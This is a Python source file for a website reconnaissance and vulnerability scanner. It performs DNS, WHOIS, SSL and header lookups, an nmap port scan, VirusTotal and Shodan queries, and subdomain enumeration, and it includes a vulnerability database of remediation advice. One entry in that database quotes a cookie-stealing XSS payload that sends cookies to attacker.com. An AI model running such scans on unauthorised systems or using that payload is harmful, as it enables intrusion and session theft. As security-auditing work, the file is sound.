import socket
import requests
import dns.resolver
import ssl
import nmap
import os
import logging
import urllib3
import whois
import shodan
from bs4 import BeautifulSoup
from datetime import datetime
from collections import Counter
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable, LongTable, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.enums import TA_CENTER

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ─── API Keys ─────────────────────────────────────────────────────────────────

import os

API_KEYS = {
    "virustotal": os.getenv("VT_API_KEY"),
    "shodan": os.getenv("SHODAN_API_KEY"),
    "dnsdumpster": os.getenv("DNSDUMPSTER_API_KEY"),
}

# ─── Constants ────────────────────────────────────────────────────────────────
REQUEST_TIMEOUT = 10
SSL_TIMEOUT     = 5
SCAN_TIMEOUT    = 90   # increased slightly to accommodate extra API calls

# ─── Setup ────────────────────────────────────────────────────────────────────
os.makedirs("logs",    exist_ok=True)
os.makedirs("reports", exist_ok=True)
logging.basicConfig(
    filename="logs/scan.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════════╗
║       Website Reconnaissance & Vulnerability Scanner         ║
╚══════════════════════════════════════════════════════════════╝

[+] Initializing modules...
[+] Loading reconnaissance engine
[+] Loading vulnerability scanner
[+] Loading threat intelligence (VirusTotal / Shodan / DNSDumpster)
[+] Preparing reporting system

──────────────────────────────────────────────────────────────

 Version      : 2.0.0
 Platform     : Linux
 Mode         : Website/Application scanning
 Author       : AvirajShinde

──────────────────────────────────────────────────────────────

[>] Ready. Enter target URL or domain to begin scan.

""")

# ─── Utilities ────────────────────────────────────────────────────────────────
def validate_domain(domain: str) -> str:
    domain = domain.lower().strip()
    for prefix in ("https://", "http://"):
        if domain.startswith(prefix):
            domain = domain[len(prefix):]
    return domain.strip("/").split("/")[0]

def get_machine_ip() -> str:
    try:
        resp = requests.get("https://api.ipify.org", timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        return resp.text.strip()
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "Unknown"

def save_short_log(domain: str, machine_ip: str) -> None:
    try:
        with open("logs/short_scan.log", "a") as f:
            f.write(f"{datetime.now().isoformat()} | Domain: {domain} | Scanner IP: {machine_ip}\n")
    except OSError as e:
        logging.warning(f"Could not write short log: {e}")

def _ok(label: str)           -> None: print(Fore.GREEN + f"  [✔] {label}          ")
def _fail(label: str, r: str) -> None: print(Fore.RED   + f"  [✘] {label}: {r}")
def _status(label: str)       -> None: print(Fore.CYAN  + f"  [~] {label}...", end="\r")
def _warn(label: str)         -> None: print(Fore.YELLOW + f"  [!] {label}")

# ─── IP Resolution ────────────────────────────────────────────────────────────
def get_ip(domain: str) -> str:
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror as e:
        return f"IP resolution failed: {e}"

# ─── WHOIS ────────────────────────────────────────────────────────────────────
def get_whois(domain: str) -> dict | str:
    try:
        w = whois.whois(domain)
        def _fmt(val):
            if isinstance(val, list): val = val[0]
            return str(val) if val else "N/A"
        return {
            "Registrar":       _fmt(w.registrar),
            "Creation Date":   _fmt(w.creation_date),
            "Expiration Date": _fmt(w.expiration_date),
            "Name Servers":    ", ".join(str(s).lower() for s in w.name_servers) if w.name_servers else "N/A",
        }
    except Exception as e:
        return f"WHOIS lookup failed: {e}"

# ─── DNS ──────────────────────────────────────────────────────────────────────
def get_dns(domain: str) -> dict:
    records = {}
    resolver = dns.resolver.Resolver()
    resolver.lifetime = 5        # total time budget per query
    resolver.timeout = 3         # per-nameserver timeout

    for rtype in ["A", "MX", "NS", "TXT", "AAAA", "CNAME"]:
        try:
            records[rtype] = [str(r) for r in resolver.resolve(domain, rtype)]
        except dns.resolver.NoAnswer:
            records[rtype] = "No record"
        except dns.resolver.NXDOMAIN:
            records[rtype] = "Domain does not exist"
        except dns.resolver.Timeout:
            records[rtype] = "Query timed out"
        except dns.resolver.NoNameservers:
            records[rtype] = "No nameservers available"
        except Exception as e:
            records[rtype] = f"Lookup failed: {e}"   # <-- this shows the REAL error now
    return records

# ─── HTTP Headers ─────────────────────────────────────────────────────────────
def get_http_headers(domain: str) -> dict | str:
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    for scheme in ("https", "http"):
        try:
            resp = requests.get(
                f"{scheme}://{domain}", headers=hdrs,
                timeout=REQUEST_TIMEOUT, verify=(scheme == "https"),
                allow_redirects=True,
            )
            return dict(resp.headers)
        except (requests.exceptions.SSLError, requests.exceptions.ConnectionError):
            continue
        except Exception as e:
            return f"HTTP header extraction failed: {e}"
    return "Could not reach host over HTTP or HTTPS"

# ─── SSL ──────────────────────────────────────────────────────────────────────
def get_ssl_info(domain: str) -> dict | str:
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=SSL_TIMEOUT) as raw:
            with ctx.wrap_socket(raw, server_hostname=domain) as tls:
                cert   = tls.getpeercert()
                issuer = dict(x[0] for x in cert.get("issuer", []))
                return {
                    "Issuer (CN)":       issuer.get("commonName", "N/A"),
                    "Issuer (Org)":      issuer.get("organizationName", "N/A"),
                    "Valid From":        cert.get("notBefore", "N/A"),
                    "Valid To":          cert.get("notAfter",  "N/A"),
                    "Protocol":          tls.version(),
                    "Subject Alt Names": ", ".join(
                        v for t, v in cert.get("subjectAltName", []) if t == "DNS"
                    ) or "N/A",
                }
    except ssl.SSLCertVerificationError as e:
        return f"SSL verification error: {e}"
    except (socket.timeout, ConnectionRefusedError, OSError):
        return "SSL not available or port 443 closed"
    except Exception as e:
        return f"SSL information not available: {e}"

# ─── Port Scan ────────────────────────────────────────────────────────────────
def port_scan(ip: str) -> dict | str:
    try:
        nm = nmap.PortScanner()
        nm.scan(ip, arguments="-sS -T4 --top-ports 50 -n --host-timeout 30s")
        hosts = nm.all_hosts()
        if not hosts:
            return "No hosts found (host may be down or blocking probes)"
        host   = hosts[0]
        result = {"Host State": nm[host].state(), "Ports": {}}
        for proto in nm[host].all_protocols():
            for port in sorted(nm[host][proto].keys()):
                svc = nm[host][proto][port]
                result["Ports"][port] = {
                    "State":   svc["state"],
                    "Service": svc.get("name", "unknown"),
                }
        return result
    except nmap.PortScannerError as e:
        return f"nmap error (is nmap installed?): {e}"
    except Exception as e:
        return f"Port scan failed: {e}"

# ─── Website Metadata ─────────────────────────────────────────────────────────
def get_metadata(domain: str) -> dict | str:
    hdrs = {"User-Agent": "Mozilla/5.0", "Referer": "https://google.com"}
    for scheme in ("https", "http"):
        try:
            resp = requests.get(
                f"{scheme}://{domain}", headers=hdrs,
                timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
            )
            if resp.status_code != 200:
                return f"Website returned status {resp.status_code}"
            soup = BeautifulSoup(resp.text, "html.parser")
            meta = soup.find("meta", attrs={"name": "description"})
            gen  = soup.find("meta", attrs={"name": "generator"})
            return {
                "Title":       soup.title.string.strip() if soup.title else "No Title Found",
                "Description": (meta.get("content", "").strip() if meta else "") or "No Description Found",
                "Generator":   gen.get("content", "N/A").strip() if gen else "N/A",
                "Final URL":   resp.url,
                "Status Code": str(resp.status_code),
            }
        except requests.exceptions.ConnectionError:
            continue
        except Exception as e:
            return f"Metadata extraction error: {e}"
    return "Could not reach host"

# ══════════════════════════════════════════════════════════════════════════════
# ─── THREAT INTELLIGENCE MODULES ─────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

# ─── VirusTotal ───────────────────────────────────────────────────────────────
def scan_virustotal(domain: str) -> dict:
    """
    Query VirusTotal for domain reputation, malware detections and categories.
    Free API: 4 requests/min, 500/day.
    """
    api_key = API_KEYS.get("virustotal", "")
    if not api_key or api_key == "YOUR_VIRUSTOTAL_API_KEY_HERE":
        return {"Status": "API key not configured — skipped"}

    try:
        headers  = {"x-apikey": api_key}
        url      = f"https://www.virustotal.com/api/v3/domains/{domain}"
        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)

        if response.status_code == 401:
            return {"Status": "Invalid API key"}
        if response.status_code == 429:
            return {"Status": "Rate limit exceeded (free tier: 4 req/min)"}
        if response.status_code != 200:
            return {"Status": f"API error {response.status_code}"}

        data        = response.json()
        attrs       = data.get("data", {}).get("attributes", {})
        stats       = attrs.get("last_analysis_stats", {})
        categories  = attrs.get("categories", {})
        cat_vals    = list(set(categories.values()))[:5] if categories else ["N/A"]

        result = {
            "Malicious Detections":  str(stats.get("malicious", 0)),
            "Suspicious Detections": str(stats.get("suspicious", 0)),
            "Harmless Votes":        str(stats.get("harmless", 0)),
            "Undetected":            str(stats.get("undetected", 0)),
            "Reputation Score":      str(attrs.get("reputation", "N/A")),
            "Categories":            ", ".join(cat_vals) if cat_vals else "N/A",
            "Last Analysis Date":    datetime.utcfromtimestamp(
                                        attrs["last_analysis_date"]
                                    ).strftime("%Y-%m-%d %H:%M UTC")
                                    if attrs.get("last_analysis_date") else "N/A",
        }

        # Collect names of engines that flagged as malicious/suspicious
        flagging_engines = [
            engine for engine, res
            in attrs.get("last_analysis_results", {}).items()
            if res.get("category") in ("malicious", "suspicious")
        ]
        result["Flagged By"] = ", ".join(flagging_engines[:8]) if flagging_engines else "None"
        return result

    except requests.exceptions.Timeout:
        return {"Status": "Request timed out"}
    except Exception as e:
        logging.error(f"VirusTotal error: {e}")
        return {"Status": f"Error: {str(e)[:80]}"}


# ─── Shodan ───────────────────────────────────────────────────────────────────
def scan_shodan(ip: str) -> dict:
    """
    Query Shodan for open ports, banners, CVEs, OS, and org information.
    Free API: historical data only (no real-time scan).
    """
    api_key = API_KEYS.get("shodan", "")
    if not api_key or api_key == "YOUR_SHODAN_API_KEY_HERE":
        return {"Status": "API key not configured — skipped"}
    if not ip or ip.startswith("IP resolution"):
        return {"Status": "Invalid IP — skipped"}

    try:
        api  = shodan.Shodan(api_key)
        host = api.host(ip)

        open_ports = host.get("ports", [])
        vulns      = list(host.get("vulns", []))

        # Collect service banners (first 5 services, trimmed)
        services = []
        for item in host.get("data", [])[:5]:
            banner = item.get("data", "").strip()[:120].replace("\n", " ")
            services.append(f"Port {item['port']}: {banner}" if banner else f"Port {item['port']}: (no banner)")

        result = {
            "Organisation":  host.get("org",          "N/A"),
            "ISP":           host.get("isp",           "N/A"),
            "Country":       host.get("country_name",  "N/A"),
            "City":          host.get("city",          "N/A"),
            "OS":            host.get("os",            "N/A"),
            "Open Ports":    ", ".join(str(p) for p in open_ports) if open_ports else "None detected",
            "CVEs Found":    ", ".join(vulns) if vulns else "None",
            "Hostnames":     ", ".join(host.get("hostnames", [])) or "N/A",
            "Last Updated":  host.get("last_update", "N/A"),
            "Services":      "\n".join(services) if services else "N/A",
        }
        return result

    except shodan.APIError as e:
        err = str(e)
        if "No information available" in err:
            return {"Status": "No Shodan data for this IP"}
        if "Invalid API key" in err:
            return {"Status": "Invalid Shodan API key"}
        return {"Status": f"Shodan API error: {err[:80]}"}
    except Exception as e:
        logging.error(f"Shodan error: {e}")
        return {"Status": f"Error: {str(e)[:80]}"}


# ─── DNSDumpster ──────────────────────────────────────────────────────────────
def scan_dnsdumpster(domain: str) -> dict:
    """
    Enumerate subdomains via HackerTarget API (free, no key needed for basic use).
    Falls back to crt.sh certificate transparency if HackerTarget fails.
    """

    # ── Method 1: HackerTarget free API ──────────────────────────────────────
    try:
        url  = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        resp = requests.get(url, timeout=REQUEST_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0"})

        if resp.status_code == 200 and "error" not in resp.text.lower() and resp.text.strip():
            lines   = [l.strip() for l in resp.text.splitlines() if l.strip()]
            records = []
            for line in lines[:40]:
                parts = line.split(",")
                if len(parts) == 2:
                    records.append(f"{parts[0]}  →  {parts[1]}")
                else:
                    records.append(line)

            return {
                "Source":           "HackerTarget API (free)",
                "Subdomains Found": str(len(records)),
                "Records":          "\n".join(records) if records else "None found",
            }
    except Exception as e:
        logging.warning(f"HackerTarget failed: {e}")

    # ── Method 2: crt.sh certificate transparency logs ───────────────────────
    try:
        url  = f"https://crt.sh/?q=%.{domain}&output=json"
        resp = requests.get(url, timeout=REQUEST_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0"})

        if resp.status_code == 200:
            data    = resp.json()
            # Extract unique subdomains
            subs = sorted(set(
                entry["name_value"].lower()
                for entry in data
                if "*" not in entry["name_value"]   # skip wildcards
            ))

            records = [f"{sub}  →  (certificate transparency log)" for sub in subs[:40]]

            return {
                "Source":           "crt.sh (Certificate Transparency)",
                "Subdomains Found": str(len(subs)),
                "Records":          "\n".join(records) if records else "None found",
            }
    except Exception as e:
        logging.warning(f"crt.sh fallback failed: {e}")

    # ── Method 3: DNS brute-force common subdomains ───────────────────────────
    try:
        common_subs = [
            "www", "mail", "ftp", "admin", "portal", "api",
            "dev", "staging", "test", "shop", "blog", "cdn",
            "remote", "vpn", "support", "help", "app", "beta",
            "secure", "login", "webmail", "smtp", "pop", "imap"
        ]
        found = []
        resolver = dns.resolver.Resolver()
        resolver.lifetime = 3
        resolver.nameservers = ['8.8.8.8', '1.1.1.1']

        for sub in common_subs:
            try:
                full = f"{sub}.{domain}"
                ans  = resolver.resolve(full, "A")
                ips  = [str(r) for r in ans]
                found.append(f"{full}  →  {', '.join(ips)}")
            except Exception:
                pass  # subdomain doesn't exist, skip silently

        return {
            "Source":           "DNS Brute-Force (common subdomains)",
            "Subdomains Found": str(len(found)),
            "Records":          "\n".join(found) if found else "No common subdomains resolved",
        }
    except Exception as e:
        return {"Status": f"All subdomain enumeration methods failed: {e}"}
    # ── Free scraping via DNSDumpster ─────────────────────────────────────────
    try:
        session  = requests.Session()
        base_url = "https://dnsdumpster.com"

        # Step 1 — get CSRF token
        resp = session.get(base_url, timeout=REQUEST_TIMEOUT,
                           headers={"User-Agent": "Mozilla/5.0"})
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
        if not csrf_input:
            return {"Status": "Could not retrieve CSRF token from DNSDumpster"}

        # Step 2 — POST the domain lookup
        post_headers = {
            "Referer":    base_url,
            "User-Agent": "Mozilla/5.0",
            "Origin":     base_url,
        }
        post_data = {
            "csrfmiddlewaretoken": csrf_input["value"],
            "targetip":            domain,
            "user":                "free",
        }
        resp = session.post(base_url, data=post_data,
                            headers=post_headers, timeout=REQUEST_TIMEOUT)
        soup = BeautifulSoup(resp.text, "html.parser")

        # Step 3 — parse result tables
        records      = []
        section_map  = {
            0: "DNS Servers",
            1: "MX Records",
            2: "TXT Records",
            3: "Host Records",
        }
        for idx, table in enumerate(soup.find_all("table", class_="table")):
            label = section_map.get(idx, f"Table {idx}")
            for row in table.find_all("tr")[1:]:
                cols = [td.get_text(separator=" ", strip=True) for td in row.find_all("td")]
                if any(cols):
                    records.append(f"[{label}] " + " | ".join(c for c in cols if c))

        if not records:
            return {"Status": "No records returned — DNSDumpster may have blocked the request"}

        return {
            "Source":           "DNSDumpster (free scrape)",
            "Records Found":    str(len(records)),
            "DNS Records":      "\n".join(records[:50]),  # cap at 50 lines
        }

    except requests.exceptions.Timeout:
        return {"Status": "Request timed out"}
    except Exception as e:
        logging.error(f"DNSDumpster error: {e}")
        return {"Status": f"Error: {str(e)[:80]}"}

# ══════════════════════════════════════════════════════════════════════════════
# ─── Vulnerability Assessment ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
SEVERITY_ICONS = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}

VULN_DB = {
    "missing_csp": {
        "name":        "Missing Content-Security-Policy Header",
        "severity":    "HIGH",
        "cve":         "CWE-1021 / OWASP A05:2021",
        "description": (
            "No Content-Security-Policy header was found. CSP restricts which scripts, styles "
            "and resources a page may load. Without it, a successful XSS injection has an "
            "unrestricted execution context and can read cookies, keylog input, redirect to "
            "phishing pages or exfiltrate data to attacker-controlled servers."
        ),
        "solution":   "Add: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
        "reference":  "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
    },
    "missing_hsts": {
        "name":        "Missing HTTP Strict-Transport-Security (HSTS) Header",
        "severity":    "HIGH",
        "cve":         "CWE-319 / OWASP A02:2021",
        "description": (
            "HSTS forces browsers to use HTTPS. Without it, an attacker on the network can "
            "perform SSL-stripping: downgrading HTTPS to HTTP and intercepting credentials, "
            "session tokens and all plaintext traffic."
        ),
        "solution":   "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload — then submit to https://hstspreload.org",
        "reference":  "https://owasp.org/www-project-secure-headers/",
    },
    "missing_xframe": {
        "name":        "Missing X-Frame-Options Header (Clickjacking Risk)",
        "severity":    "MEDIUM",
        "cve":         "CWE-1021 / OWASP A05:2021",
        "description": (
            "Without X-Frame-Options or a CSP frame-ancestors directive, any site can embed "
            "this page in an iframe. Clickjacking attacks trick users into clicking invisible "
            "buttons (e.g. Confirm Transfer, Delete Account) on your site."
        ),
        "solution":   "Add: X-Frame-Options: DENY  or  Content-Security-Policy: frame-ancestors 'none'",
        "reference":  "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
    },
    "missing_xcto": {
        "name":        "Missing X-Content-Type-Options Header",
        "severity":    "MEDIUM",
        "cve":         "CWE-430 / OWASP A05:2021",
        "description": (
            "Without this header browsers may MIME-sniff responses. An attacker who can upload "
            "a file with HTML/JS content but a benign extension (.jpg, .txt) may cause the "
            "browser to execute it as a script, enabling stored XSS."
        ),
        "solution":   "Add: X-Content-Type-Options: nosniff",
        "reference":  "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
    },
    "missing_referrer": {
        "name":        "Missing Referrer-Policy Header",
        "severity":    "LOW",
        "cve":         "CWE-200 / OWASP A01:2021",
        "description": (
            "Without a Referrer-Policy, browsers send full URLs (including query strings) in "
            "the Referer header to third parties. URLs may contain session tokens, user IDs "
            "or other sensitive parameters."
        ),
        "solution":   "Add: Referrer-Policy: strict-origin-when-cross-origin",
        "reference":  "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
    },
    "missing_permissions": {
        "name":        "Missing Permissions-Policy Header",
        "severity":    "LOW",
        "cve":         "CWE-284 / OWASP A01:2021",
        "description": (
            "Without Permissions-Policy, embedded third-party scripts or iframes may access "
            "camera, microphone, geolocation or payment APIs without the user's knowledge."
        ),
        "solution":   "Add: Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()",
        "reference":  "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
    },
    "ssl_expired": {
        "name":        "SSL Certificate Has Expired",
        "severity":    "CRITICAL",
        "cve":         "CWE-298 / OWASP A02:2021",
        "description": (
            "The TLS certificate has passed its expiry date. Browsers display a full-page "
            "warning and may reject connections entirely. An expired cert provides no "
            "cryptographic guarantee of server identity, enabling MITM attacks."
        ),
        "solution":   "Renew immediately: certbot renew --force-renewal — set up auto-renewal via cron or systemd timer.",
        "reference":  "https://letsencrypt.org/docs/renewing-certificates/",
    },
    "ssl_old_protocol": {
        "name":        "Deprecated TLS Protocol Version Detected",
        "severity":    "HIGH",
        "cve":         "CVE-2014-3566 (POODLE) / CVE-2011-3389 (BEAST)",
        "description": (
            "TLS 1.0 and 1.1 are deprecated by RFC 8996. POODLE allows a MITM attacker to "
            "decrypt TLS 1.0 traffic; BEAST targets TLS 1.0 CBC mode. Both are prohibited "
            "in PCI-DSS and HIPAA compliant environments."
        ),
        "solution":   "Nginx: ssl_protocols TLSv1.2 TLSv1.3;   Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1",
        "reference":  "https://www.ssl.com/guide/disable-tls-1-0-and-1-1/",
    },
    "ssl_self_signed": {
        "name":        "Self-Signed SSL Certificate in Use",
        "severity":    "HIGH",
        "cve":         "CWE-295 / OWASP A02:2021",
        "description": (
            "The certificate is not signed by a trusted CA. Browsers show an untrusted "
            "certificate warning. Self-signed certs cannot be revoked via CRL/OCSP, enabling "
            "persistent MITM if the private key is compromised."
        ),
        "solution":   "Replace with a trusted CA certificate. Free option: Let's Encrypt (certbot) — automated 90-day auto-renewal.",
        "reference":  "https://letsencrypt.org/getting-started/",
    },
    "port_telnet": {
        "name":        "Telnet Service Exposed on Port 23",
        "severity":    "CRITICAL",
        "cve":         "CVE-1999-0619 / CWE-319",
        "description": (
            "Telnet transmits everything — usernames, passwords, all session data — in cleartext. "
            "Any attacker with network visibility can trivially capture all credentials."
        ),
        "solution":   "Disable: systemctl disable telnet — Replace with SSH: ssh-keygen -t ed25519 and set PasswordAuthentication no in sshd_config.",
        "reference":  "https://www.ssh.com/academy/ssh/telnet",
    },
    "port_ftp": {
        "name":        "FTP Service Exposed on Port 21",
        "severity":    "HIGH",
        "cve":         "CVE-1999-0497 / CWE-319",
        "description": (
            "FTP sends credentials and file contents in cleartext. A network observer captures "
            "FTP credentials instantly. Files can also be modified in transit with no integrity protection."
        ),
        "solution":   "Disable FTP: systemctl disable vsftpd — Use SFTP (over SSH) or FTPS (FTP over TLS) instead.",
        "reference":  "https://owasp.org/www-community/vulnerabilities/Cleartext_Transmission_of_Sensitive_Information",
    },
    "port_rdp": {
        "name":        "RDP Service Publicly Exposed on Port 3389",
        "severity":    "CRITICAL",
        "cve":         "CVE-2019-0708 (BlueKeep) / CVE-2019-1181 (DejaBlue)",
        "description": (
            "Public RDP is a top ransomware initial-access vector. BlueKeep allows unauthenticated "
            "RCE on unpatched Windows. Automated scanners hit port 3389 within minutes of a host going online."
        ),
        "solution":   "Block port 3389 at the firewall. Place RDP behind VPN. Enable NLA. Apply MS19-0708 patch. Lock out after 5 failed attempts.",
        "reference":  "https://www.cisa.gov/news-events/alerts/2019/05/14/microsoft-releases-security-advisory-cve-2019-0708",
    },
    "port_smb": {
        "name":        "SMB Service Publicly Exposed on Port 445",
        "severity":    "CRITICAL",
        "cve":         "CVE-2017-0144 (EternalBlue/WannaCry) / CVE-2020-0796 (SMBGhost)",
        "description": (
            "Port 445 enabled the WannaCry outbreak (200,000+ systems, 150 countries). EternalBlue "
            "gives unauthenticated RCE via SMBv1. SMBGhost is a wormable RCE in SMBv3 compression."
        ),
        "solution":   "Block port 445 at the firewall. Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false. Apply MS17-010.",
        "reference":  "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-302a",
    },
    "port_mongodb": {
        "name":        "MongoDB Database Exposed on Port 27017",
        "severity":    "CRITICAL",
        "cve":         "CVE-2015-7882 / CWE-306",
        "description": (
            "Default MongoDB requires no authentication and binds to all interfaces. Automated "
            "scripts routinely steal and ransom entire databases from exposed instances."
        ),
        "solution":   "Set bindIp: 127.0.0.1 in mongod.conf. Enable auth: security: authorization: enabled. Block port 27017 at the firewall.",
        "reference":  "https://www.mongodb.com/docs/manual/administration/security-checklist/",
    },
    "port_redis": {
        "name":        "Redis Cache Exposed on Port 6379",
        "severity":    "CRITICAL",
        "cve":         "CVE-2022-0543 / CWE-306",
        "description": (
            "Redis has no authentication by default. Attackers can read/delete all data and use "
            "CONFIG SET to write arbitrary files (SSH keys, cron jobs, webshells), achieving RCE."
        ),
        "solution":   "Set bind 127.0.0.1 and requirepass <strong-pw> in redis.conf. Block port 6379. Rename dangerous commands.",
        "reference":  "https://redis.io/docs/management/security/",
    },
    "port_mysql": {
        "name":        "MySQL Database Exposed on Port 3306",
        "severity":    "HIGH",
        "cve":         "CWE-306 / OWASP A01:2021",
        "description": (
            "Public MySQL enables brute-force attacks. Successful access allows full data "
            "exfiltration, schema modification and server file reads via LOAD DATA INFILE."
        ),
        "solution":   "Set bind-address = 127.0.0.1 in mysqld.cnf. Block port 3306. Use SSH tunnel for remote admin: ssh -L 3306:localhost:3306 user@host",
        "reference":  "https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html",
    },
    "port_postgres": {
        "name":        "PostgreSQL Database Exposed on Port 5432",
        "severity":    "HIGH",
        "cve":         "CWE-306 / OWASP A01:2021",
        "description": (
            "Public PostgreSQL enables brute-force and exploitation. Superuser access allows "
            "arbitrary file read/write via COPY and server-side code execution via plpgsql."
        ),
        "solution":   "Set listen_addresses = 'localhost' in postgresql.conf. Block port 5432. Review pg_hba.conf — never use 'trust' for network connections.",
        "reference":  "https://www.postgresql.org/docs/current/auth-pg-hba-conf.html",
    },
    "port_elasticsearch": {
        "name":        "Elasticsearch Service Exposed on Port 9200",
        "severity":    "CRITICAL",
        "cve":         "CVE-2014-3120 / CVE-2015-1427",
        "description": (
            "Default Elasticsearch has no authentication — all indices are world-readable/writable. "
            "CVE-2015-1427 allows unauthenticated RCE via the dynamic scripting API."
        ),
        "solution":   "Set network.host: 127.0.0.1 in elasticsearch.yml. Enable xpack.security.enabled: true. Block ports 9200/9300.",
        "reference":  "https://www.elastic.co/guide/en/elasticsearch/reference/current/secure-cluster.html",
    },
    "server_version_disclosure": {
        "name":        "Web Server Version Disclosed in Response Headers",
        "severity":    "MEDIUM",
        "cve":         "CWE-200 / OWASP A05:2021",
        "description": (
            "The Server header reveals the exact web server name and version (e.g. Apache/2.4.49). "
            "Attackers use this to find version-specific CVEs and public exploits instantly."
        ),
        "solution":   "Apache: ServerTokens Prod + ServerSignature Off   Nginx: server_tokens off;   IIS: remove via URL Rewrite module.",
        "reference":  "https://owasp.org/www-project-secure-headers/",
    },
    "xpowered_disclosure": {
        "name":        "Backend Technology Disclosed via X-Powered-By Header",
        "severity":    "LOW",
        "cve":         "CWE-200 / OWASP A05:2021",
        "description": (
            "X-Powered-By reveals backend technology and version (e.g. PHP/7.4.3, ASP.NET 4.0). "
            "This reduces attacker effort in finding and targeting version-specific vulnerabilities."
        ),
        "solution":   "PHP: expose_php = Off   Express: app.disable('x-powered-by')   ASP.NET: <customHeaders><remove name='X-Powered-By'/>",
        "reference":  "https://owasp.org/www-project-secure-headers/",
    },
    "missing_spf": {
        "name":        "Missing SPF Record — Domain Email Spoofing Risk",
        "severity":    "MEDIUM",
        "cve":         "CWE-345 / Email Spoofing",
        "description": (
            "Without SPF, any server can send email claiming to be from your domain. Attackers "
            "exploit this for phishing, brand impersonation and business email compromise (BEC)."
        ),
        "solution":   "Add TXT record: v=spf1 include:_spf.google.com ~all  (adjust for your mail providers; use -all for strict rejection)",
        "reference":  "https://www.cloudflare.com/learning/dns/dns-records/dns-spf-record/",
    },
    "missing_dmarc": {
        "name":        "Missing DMARC Record — Email Authentication Gap",
        "severity":    "MEDIUM",
        "cve":         "CWE-345 / Email Spoofing / BEC",
        "description": (
            "Without DMARC, receiving servers have no policy when SPF/DKIM fail. You receive no "
            "spoofing reports. Google and Yahoo now require DMARC for bulk senders."
        ),
        "solution":   "Add TXT record at _dmarc.yourdomain.com: v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com; pct=100",
        "reference":  "https://dmarc.org/overview/",
    },
    "cookie_no_secure": {
        "name":        "Session Cookie Missing 'Secure' Flag",
        "severity":    "HIGH",
        "cve":         "CWE-614 / OWASP A02:2021",
        "description": (
            "Cookies without Secure are sent over HTTP. An SSL-stripping attacker captures the "
            "session token and hijacks the account even if the site enforces HTTPS."
        ),
        "solution":   "Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/  — combine with HSTS.",
        "reference":  "https://owasp.org/www-community/controls/SecureCookieAttribute",
    },
    "cookie_no_httponly": {
        "name":        "Session Cookie Missing 'HttpOnly' Flag",
        "severity":    "HIGH",
        "cve":         "CWE-1004 / OWASP A07:2021",
        "description": (
            "Cookies without HttpOnly are readable via document.cookie. Any XSS vulnerability "
            "allows attackers to steal all session tokens: fetch('https://attacker.com/?c='+document.cookie)"
        ),
        "solution":   "Flask: SESSION_COOKIE_HTTPONLY = True   Express: res.cookie('session', token, { httpOnly: true, secure: true })",
        "reference":  "https://owasp.org/www-community/HttpOnly",
    },
    # ── New: VirusTotal-sourced finding ──────────────────────────────────────
    "vt_malicious": {
        "name":        "Domain Flagged as Malicious by VirusTotal",
        "severity":    "CRITICAL",
        "cve":         "OWASP A06:2021 / Threat Intelligence",
        "description": (
            "Multiple antivirus/security engines on VirusTotal have flagged this domain as "
            "malicious or suspicious. This may indicate active malware distribution, phishing, "
            "C2 infrastructure, or a previously compromised host."
        ),
        "solution":   "Investigate flagged engines at virustotal.com. If legitimate, request review/whitelist. Check for injected scripts, defacement or malware via hosting panel.",
        "reference":  "https://www.virustotal.com",
    },
    # ── New: Shodan CVE finding ───────────────────────────────────────────────
    "shodan_cve": {
        "name":        "Known CVE Detected via Shodan Intelligence",
        "severity":    "HIGH",
        "cve":         "See evidence field for specific CVE",
        "description": (
            "Shodan's passive scanning database has associated one or more public CVEs with this "
            "IP address. This indicates a running service may be unpatched and vulnerable to "
            "known public exploits."
        ),
        "solution":   "Identify the vulnerable service, apply vendor patches immediately, or restrict access via firewall until patched. Check NVD for exploit availability.",
        "reference":  "https://nvd.nist.gov/",
    },
}

DANGEROUS_PORTS = {
    21: "port_ftp", 23: "port_telnet", 445: "port_smb",
    3306: "port_mysql", 3389: "port_rdp", 5432: "port_postgres",
    6379: "port_redis", 9200: "port_elasticsearch", 27017: "port_mongodb",
}

def check_vulnerabilities(scan_data: dict) -> list:
    findings = []

